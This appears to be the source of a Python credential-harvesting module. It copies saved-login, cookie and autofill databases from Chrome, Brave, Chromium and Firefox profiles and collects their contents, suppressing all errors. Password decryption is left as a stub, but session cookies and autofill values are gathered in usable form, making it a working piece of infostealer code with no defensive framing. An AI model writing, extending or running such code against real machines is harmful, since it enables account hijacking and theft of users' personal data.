#!/usr/bin/env python3
"""
Browser Credential Extractor Module
Extracts saved passwords and cookies from Chrome and Firefox
"""

import os
import sqlite3
import json
import base64
import shutil
import tempfile
from pathlib import Path
from typing import List, Dict, Any
import subprocess


class BrowserExtractor:
    def __init__(self, config):
        self.config = config
        self.browser_paths = config.get("scan_paths", {}).get("browsers", {})
        
    def extract_all(self) -> Dict[str, Any]:
        """Extract credentials from all supported browsers"""
        results = {
            "chrome": {},
            "firefox": {},
            "brave": {},
            "chromium": {}
        }
        
        # Extract from Chrome-based browsers
        results["chrome"] = self._extract_chrome_credentials()
        results["brave"] = self._extract_brave_credentials()
        results["chromium"] = self._extract_chromium_credentials()
        
        # Extract from Firefox
        results["firefox"] = self._extract_firefox_credentials()
        
        return results
    
    def _extract_chrome_credentials(self) -> Dict[str, Any]:
        """Extract credentials from Google Chrome"""
        return self._extract_chromium_based_credentials("chrome")
    
    def _extract_brave_credentials(self) -> Dict[str, Any]:
        """Extract credentials from Brave Browser"""
        return self._extract_chromium_based_credentials("brave")
    
    def _extract_chromium_credentials(self) -> Dict[str, Any]:
        """Extract credentials from Chromium"""
        return self._extract_chromium_based_credentials("chromium")
    
    def _extract_chromium_based_credentials(self, browser_type: str) -> Dict[str, Any]:
        """Extract credentials from Chromium-based browsers"""
        results = {
            "passwords": [],
            "cookies": [],
            "autofill": [],
            "profile_paths": []
        }
        
        browser_paths = self.browser_paths.get(browser_type, [])
        
        for base_path in browser_paths:
            expanded_path = os.path.expanduser(base_path)
            
            if os.path.exists(expanded_path):
                results["profile_paths"].append(expanded_path)
                
                # Extract passwords
                passwords = self._extract_chrome_passwords(expanded_path)
                results["passwords"].extend(passwords)
                
                # Extract cookies
                cookies = self._extract_chrome_cookies(expanded_path)
                results["cookies"].extend(cookies)
                
                # Extract autofill data
                autofill = self._extract_chrome_autofill(expanded_path)
                results["autofill"].extend(autofill)
        
        return results
    
    def _extract_chrome_passwords(self, profile_path: str) -> List[Dict[str, Any]]:
        """Extract saved passwords from Chrome"""
        passwords = []
        login_data_path = os.path.join(profile_path, "Login Data")
        
        if not os.path.exists(login_data_path):
            return passwords
        
        # Create a temporary copy of the database
        temp_db = None
        try:
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
            shutil.copy2(login_data_path, temp_db.name)
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            
            # Query for saved passwords
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created, date_last_used
                FROM logins
                WHERE username_value != '' AND password_value != ''
            """)
            
            for row in cursor.fetchall():
                origin_url, username, encrypted_password, date_created, date_last_used = row
                
                # Try to decrypt password (this is simplified - real decryption requires OS keychain)
                decrypted_password = self._attempt_chrome_decrypt(encrypted_password)
                
                passwords.append({
                    "url": origin_url,
                    "username": username,
                    "password": decrypted_password,
                    "encrypted": decrypted_password is None,
                    "date_created": date_created,
                    "date_last_used": date_last_used,
                    "profile_path": profile_path
                })
            
            conn.close()
            
        except Exception as e:
            pass
        finally:
            if temp_db:
                os.unlink(temp_db.name)
        
        return passwords
    
    def _extract_chrome_cookies(self, profile_path: str) -> List[Dict[str, Any]]:
        """Extract cookies from Chrome"""
        cookies = []
        cookies_path = os.path.join(profile_path, "Cookies")
        
        if not os.path.exists(cookies_path):
            return cookies
        
        temp_db = None
        try:
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
            shutil.copy2(cookies_path, temp_db.name)
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            
            # Query for cookies
            cursor.execute("""
                SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
                FROM cookies
                WHERE value != ''
            """)
            
            for row in cursor.fetchall():
                host, name, value, path, expires, is_secure, is_httponly = row
                
                # Try to decrypt cookie value
                decrypted_value = self._attempt_chrome_decrypt(value)
                
                cookies.append({
                    "host": host,
                    "name": name,
                    "value": decrypted_value,
                    "encrypted": decrypted_value is None,
                    "path": path,
                    "expires": expires,
                    "secure": bool(is_secure),
                    "httponly": bool(is_httponly),
                    "profile_path": profile_path
                })
            
            conn.close()
            
        except Exception as e:
            pass
        finally:
            if temp_db:
                os.unlink(temp_db.name)
        
        return cookies
    
    def _extract_chrome_autofill(self, profile_path: str) -> List[Dict[str, Any]]:
        """Extract autofill data from Chrome"""
        autofill = []
        web_data_path = os.path.join(profile_path, "Web Data")
        
        if not os.path.exists(web_data_path):
            return autofill
        
        temp_db = None
        try:
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
            shutil.copy2(web_data_path, temp_db.name)
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            
            # Query for autofill data
            cursor.execute("""
                SELECT name, value, count, date_created, date_last_used
                FROM autofill
                WHERE value != ''
            """)
            
            for row in cursor.fetchall():
                name, value, count, date_created, date_last_used = row
                
                autofill.append({
                    "field_name": name,
                    "value": value,
                    "usage_count": count,
                    "date_created": date_created,
                    "date_last_used": date_last_used,
                    "profile_path": profile_path
                })
            
            conn.close()
            
        except Exception as e:
            pass
        finally:
            if temp_db:
                os.unlink(temp_db.name)
        
        return autofill
    
    def _attempt_chrome_decrypt(self, encrypted_data: bytes) -> str:
        """Attempt to decrypt Chrome encrypted data"""
        # This is a simplified version - real decryption requires:
        # 1. Access to the OS keychain (gnome-keyring, kwallet, etc.)
        # 2. Chrome's encryption key derivation
        # 3. AES decryption
        
        try:
            # For now, return None to indicate encrypted data
            # In a real implementation, you would:
            # 1. Extract the encryption key from the OS keychain
            # 2. Derive the decryption key using PBKDF2
            # 3. Decrypt using AES-128-CBC
            
            return None
        except Exception:
            return None
    
    def _extract_firefox_credentials(self) -> Dict[str, Any]:
        """Extract credentials from Firefox"""
        results = {
            "passwords": [],
            "cookies": [],
            "profile_paths": []
        }
        
        firefox_paths = self.browser_paths.get("firefox", [])
        
        for base_path in firefox_paths:
            expanded_path = os.path.expanduser(base_path)
            
            if os.path.exists(expanded_path):
                results["profile_paths"].append(expanded_path)
                
                # Extract passwords
                passwords = self._extract_firefox_passwords(expanded_path)
                results["passwords"].extend(passwords)
                
                # Extract cookies
                cookies = self._extract_firefox_cookies(expanded_path)
                results["cookies"].extend(cookies)
        
        return results
    
    def _extract_firefox_passwords(self, profile_path: str) -> List[Dict[str, Any]]:
        """Extract saved passwords from Firefox"""
        passwords = []
        
        # Firefox stores passwords in key4.db and logins.json
        key4_db_path = os.path.join(profile_path, "key4.db")
        logins_json_path = os.path.join(profile_path, "logins.json")
        
        if not os.path.exists(key4_db_path) or not os.path.exists(logins_json_path):
            return passwords
        
        try:
            # Read logins.json
            with open(logins_json_path, 'r') as f:
                logins_data = json.load(f)
            
            # Extract login entries
            for entry in logins_data.get("logins", []):
                login_info = entry.get("hostname", "")
                username = entry.get("encryptedUsername", "")
                password = entry.get("encryptedPassword", "")
                
                # Note: Decryption requires the key4.db database and master password
                # This is a simplified version showing the structure
                
                passwords.append({
                    "url": login_info,
                    "username": username,
                    "password": password,
                    "encrypted": True,
                    "profile_path": profile_path
                })
        
        except Exception as e:
            pass
        
        return passwords
    
    def _extract_firefox_cookies(self, profile_path: str) -> List[Dict[str, Any]]:
        """Extract cookies from Firefox"""
        cookies = []
        cookies_sqlite_path = os.path.join(profile_path, "cookies.sqlite")
        
        if not os.path.exists(cookies_sqlite_path):
            return cookies
        
        temp_db = None
        try:
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
            shutil.copy2(cookies_sqlite_path, temp_db.name)
            
            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            
            # Query for cookies
            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly
                FROM moz_cookies
                WHERE value != ''
            """)
            
            for row in cursor.fetchall():
                host, name, value, path, expiry, is_secure, is_httponly = row
                
                cookies.append({
                    "host": host,
                    "name": name,
                    "value": value,
                    "path": path,
                    "expires": expiry,
                    "secure": bool(is_secure),
                    "httponly": bool(is_httponly),
                    "profile_path": profile_path
                })
            
            conn.close()
            
        except Exception as e:
            pass
        finally:
            if temp_db:
                os.unlink(temp_db.name)
        
        return cookies 